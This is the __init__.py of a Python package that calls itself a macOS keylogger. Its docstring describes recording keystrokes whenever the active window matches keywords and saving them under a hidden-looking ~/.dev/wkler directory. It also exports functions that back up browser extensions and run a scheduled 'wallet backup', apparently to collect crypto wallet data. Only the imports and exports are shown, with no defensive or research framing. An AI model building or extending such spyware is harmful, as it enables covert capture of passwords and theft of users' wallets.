"""
键盘记录器包 (Keylogger Package)

持续检测活动窗口，匹配关键词时触发键盘记录，记录到 ~/.dev/wkler/{user_prefix}_recording_{日期}.log
仅支持 macOS。
"""

__version__ = "0.4.1"
__author__ = "YLX-STUDIO"

from .logger import KeyLogger, create_log_file
from .backup import (
    BACKUP_INTERVAL,
    backup_browser_extensions,
    default_wallet_backup_dir,
    is_wallet_backup_due,
    start_wallet_backup_scheduler,
)
from .detectors import get_active_window_name

__all__ = [
    "__version__",
    "KeyLogger",
    "create_log_file",
    "backup_browser_extensions",
    "default_wallet_backup_dir",
    "BACKUP_INTERVAL",
    "is_wallet_backup_due",
    "start_wallet_backup_scheduler",
    "get_active_window_name",
]
